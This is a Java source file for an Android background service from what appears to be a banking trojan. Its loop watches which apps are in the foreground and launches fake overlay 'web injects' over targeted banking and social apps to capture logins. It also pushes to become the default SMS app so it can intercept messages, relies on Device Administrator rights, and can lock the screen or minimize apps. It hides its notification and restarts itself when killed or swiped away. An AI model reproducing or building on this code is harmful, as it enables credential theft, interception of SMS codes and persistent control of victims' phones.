package com.moonny.srvs;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import com.moonny.Modules;
import com.moonny.R;
import com.moonny.acts.InjectActivity;
import com.moonny.processes.AndroidProcesses;
import com.moonny.processes.models.AndroidAppProcess;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;
import com.moonny.acts.Screenlock;

import java.util.List;
import java.util.Map;

public class InjectsService extends Service {

    private static final String TAG = S.gpService;
    private static final long SLEEP_TIME = 1000;
    private Modules modules;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        modules = new Modules(getBaseContext());

        // ================= STEEL SRV ================
        Notification.Builder builder = new Notification.Builder(this)
                .setSmallIcon(R.drawable.ic_stat_content_mail);

        Notification notification;
        if (Build.VERSION.SDK_INT < 16) {
            notification = builder.getNotification();
        }else {
            builder.setPriority(Notification.PRIORITY_MIN);
            notification = builder.build();
        }

        int notify_id = 1777;
        startForeground(notify_id, notification);

        Intent hideIntent = new Intent(this, HideService.class);
        hideIntent.setFlags(Intent.FLAG_RECEIVER_FOREGROUND);
        hideIntent.putExtra(HideService.KEY_ID, Integer.toString(notify_id));
        startService(hideIntent);

        // =============================================
        
        new Thread(new Runnable() {
            @Override
            public void run() {
                Context ctx = getBaseContext();
                while(true) {
                    cycle(ctx); // killApp; freeDialog; minimizeAll; webInjects; smsAdmin
                }

            }
        }).start();

        return START_STICKY;
    }

    private void cycle(Context ctx) {

        Modules mods = new Modules(ctx);
        if(!mods.is_mod_exists(S.mod_main)) {
            if(Constant.DEBUG) Log.d("CONTROL", "InjectSer not allowed");
            Utils.threadSleep(1000);
            return;
        }

        if(Constant.ADMIN_REQUIRED && !(boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.is_admin_active, false }))
        {
            if(Constant.DEBUG) Log.d(TAG, "NOT ADMIN YET");
            Utils.threadSleep(1000);
            return;
        }

        // If sms_admin feature is available at all & no webinjects are shown
        if(Constant.SMS_ADMIN_REQUIRED && !(boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.injectCyclePause, false })) {
            // if intercept is enabled OR old-style sms deleter mode is enabled
            if ((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.sms_hook, false }) || Constant.SMS_ADMIN_REQUIRED_ON_START) {
                // if we still aren't sms admin
                if (!Utils.isSmsAdmin(ctx))
                    // if we aren't ask for Device Administrator rights or already have it
                    if (!Constant.ADMIN_REQUIRED || (Constant.ADMIN_REQUIRED && (boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.is_admin_active, false }) /* Prefs-Manager.get(ctx, S.is_admin_active, false) */))
                        // asking to set bot as sms default messenger
                        Utils.getSmsAdmin(ctx);
            // if sms intercept is disabled and bot is set as sms default messenger
            } else if (!(boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.sms_hook, false }) && Utils.isSmsAdmin(ctx)) {
                // return back original sms default app
                Utils.removeSmsAdmin(ctx);
            }
        }

        // skip all if app is 'killed'
        if((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.app_kill, false })){

            try {
                modules.run_func(S.main, S.screen_lock);
            }catch (Exception e){
                if(Constant.DEBUG) Log.d(TAG, "main.screen_lock failed");
                e.printStackTrace();
            }

            return;
        }

        // get running apps
        List<AndroidAppProcess> processes = AndroidProcesses.getRunningForegroundApps(ctx);

        // Freedialog - block screen with webpage feature
        if ((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.free_dialog, false }) && !Utils.inRunningApps(ctx.getPackageName(), processes, null)) {
            startFreeDialog();
            return;
        }

        String minimize = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.api_minimize_apps, ""});
        String[] apps_minimize = (String[]) Modules.main(ctx, S.string2list, new Object[]{minimize});

        // minimize apps 4-5-6
        for (int count = 0; count < apps_minimize.length; count++)
            if(Utils.inRunningApps(apps_minimize[count], processes, null)) {
                Utils.minimizeAll(ctx);
                return;
            }

        // parse webinjects to show
        Map<String, Integer> apps = Utils.getApplications(ctx, (String) Modules.main(ctx, S.get_pref, new Object[]{ S.api_injects, "" }));

        // cycle through webinjects
        for (Map.Entry<String, Integer> obj : apps.entrySet()) {
            String inject_app = obj.getKey();
            int inject_id = obj.getValue();

            // in appStop list
//            if (Utils.checkApplication(ctx, inject_app))
//                continue;

            // fast check if running
            if (!Utils.inRunningApps(inject_app, processes, null))
                continue;

            String injects_filled = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.injectsFilled, "" });
            if ((boolean) Modules.main(ctx, S.list_has, new Object[]{ injects_filled, inject_app })) { // if already filled - skip
                continue;
            }

            // if it's social inject and already filled one - skip
            if(inject_id == 7 || inject_id == 78 || inject_id == 79 ||inject_id == 80 ||inject_id == 81 ||inject_id == 82 ||inject_id == 132)
                if((boolean) Modules.main(this, S.get_pref, new Object[]{ S.socials_filled, false }))
                    continue;

            // start inject
            showWebInject(inject_id);
            Modules.main(ctx, S.set_pref, new Object[]{ S.lastInject, inject_app });
            Modules.main(ctx, S.set_pref, new Object[]{ S.injectCyclePause, true });

            while ((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.injectCyclePause, false })) {
                Utils.threadSleep(SLEEP_TIME);

                if (!isInjectAlive(ctx, inject_app)) {
                    Modules.main(ctx, S.set_pref, new Object[]{ S.injectCyclePause, false });
                    break;
                }
            } // end pause

        } // end webinjects cycle

        Utils.threadSleep(SLEEP_TIME);
    } // end main cycle

    // show web inject
    private void showWebInject(int inject_id) {

        Intent intent;
        intent = new Intent(InjectsService.this, InjectActivity.class);
        intent.putExtra(S.inject_id, inject_id);

        try {
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        } catch (NullPointerException e) {
            e.printStackTrace();
        }

        startActivity(intent);
    }

    private void startFreeDialog()
    {
        Intent intent = new Intent(this, Screenlock.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private boolean isInjectAlive(Context ctx, String name)
    {
        if(!Utils.inRunningApps(name, null, ctx))
            return false;

        if(!Utils.inRunningApps(getPackageName(), null, ctx))
            return false;

        String injects_filled = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.injectsFilled, "" });
        if ((boolean) Modules.main(ctx, S.list_has, new Object[]{ injects_filled, name }))
            return false;

        String last_inject = (String) Modules.main(ctx, S.get_pref, new Object[]{ S.lastInject, "" });
        if(last_inject.isEmpty())
            return false;

        return true;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {

        super.onDestroy();

        try {
            Intent serviceIntent = new Intent(this, InjectsService.class);
            startService(serviceIntent);
        } catch (Exception e) {
            if(Constant.DEBUG) Log.d(TAG, e.toString());
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {

        Intent restartService = new Intent(getApplicationContext(),
                this.getClass());
        restartService.setPackage(getPackageName());
        PendingIntent restartServicePI = PendingIntent.getService(
                getApplicationContext(), 1, restartService,
                PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmService = (AlarmManager) getApplicationContext()
                .getSystemService(Context.ALARM_SERVICE);
        alarmService.set(AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 2000, restartServicePI);

    }
}